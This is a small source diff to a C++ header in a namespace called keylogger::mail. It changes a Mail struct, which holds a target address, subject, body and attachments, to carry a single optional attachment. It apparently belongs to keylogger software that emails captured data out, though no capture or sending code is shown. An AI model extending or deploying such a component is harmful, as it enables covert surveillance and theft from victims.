@@ -1,7 +1,7 @@
 #pragma once
 
 #include <string>
-#include <vector>
+#include <optional>
 
 namespace keylogger::mail
 {
@@ -11,6 +11,6 @@ struct Mail
     std::string emailTargetAddress;
     std::string subject;
     std::string body;
-    std::vector<std::string> attachments;
+    std::optional<std::string> attachment;
 };
 }
